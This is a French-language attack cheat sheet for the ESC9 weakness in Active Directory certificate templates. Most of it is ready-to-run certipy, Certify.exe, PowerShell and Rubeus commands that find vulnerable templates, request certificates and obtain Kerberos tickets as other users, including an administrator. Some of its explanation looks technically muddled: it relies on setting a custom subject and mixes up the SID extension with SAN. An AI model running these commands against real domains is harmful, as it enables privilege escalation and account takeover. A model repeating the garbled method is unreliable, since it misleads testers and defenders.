### Description

ESC9 exploite des modèles de certificats configurés avec l'attribut `msPKI-Certificate-Name-Flag` contenant `CT_FLAG_NO_SECURITY_EXTENSION` (0x80000), permettant à un utilisateur de demander un certificat sans les extensions de sécurité normales, ce qui peut contourner certaines vérifications d'authentification.

### Conditions vulnérables

Un modèle de certificat est vulnérable à ESC9 si :

1. **Flag NO_SECURITY_EXTENSION activé** - Le modèle a `CT_FLAG_NO_SECURITY_EXTENSION` (0x80000) dans `msPKI-Certificate-Name-Flag`
2. **Authentification client activée** - Le modèle permet l'authentification (`Client Authentication`)
3. **Enrollment autorisé** - L'utilisateur a les droits `Enroll` ou `AutoEnroll`
4. **Extensions de sécurité contournables** - Les vérifications d'identité peuvent être contournées sans les extensions SAN

---

### Exploitation depuis linux (certipy)

Enumération des templates vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec sortie JSON pour analyse des flags
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output vulnerabilities.json 

# Recherche spécifique du flag NO_SECURITY_EXTENSION
certipy find -u user@domain.local -p password -target dc01.domain.local -vulnerable | grep -A5 -B5 "CT_FLAG_NO_SECURITY_EXTENSION\|0x80000"
```

Exploitation avec certificat sans extensions de sécurité :

```bash
# Demande d'un certificat avec le template vulnérable
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'NoSecurityExtTemplate'

# Tentative avec un subject name personnalisé si possible
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'NoSecurityExtTemplate' -subject "CN=administrator,CN=Users,DC=domain,DC=local"
```

Authentification avec le certificat obtenu :

```bash
# Authentification avec le certificat sans extensions de sécurité
certipy auth -pfx user.pfx -username user -domain domain.local -dc-ip 192.168.1.10

# Si le subject a pu être modifié
certipy auth -pfx administrator.pfx -username administrator -domain domain.local -dc-ip 192.168.1.10
```

---

### Exploitation depuis windows (certify.exe)

Enumération des templates vulnérables :

```powershell
# Énumération des modèles vulnérables 
Certify.exe find /vulnerable 

# Filtrage spécifique ESC9
Certify.exe find /vulnerable | findstr "CT_FLAG_NO_SECURITY_EXTENSION\|0x80000"

# Vérification manuelle des flags
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties * | Where-Object {
    $_.'msPKI-Certificate-Name-Flag' -band 0x80000
} | Select-Object Name, 'msPKI-Certificate-Name-Flag'
```

Exploitation du template vulnérable :

```powershell
# Demande d'un certificat avec le template sans extensions de sécurité
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:NoSecurityExtTemplate

# Tentative avec subject personnalisé si le template le permet
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:NoSecurityExtTemplate /subject:"CN=targetuser,CN=Users,DC=domain,DC=local"
```

Authentification avec le certificat obtenu :

```powershell
# Conversion du certificat si nécessaire
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 

# Authentification avec le certificat 
Rubeus.exe asktgt /user:user /certificate:cert.pfx /password:password123 /ptt

# Test avec différents utilisateurs si le subject a pu être modifié
Rubeus.exe asktgt /user:targetuser /certificate:cert.pfx /password:password123 /ptt
```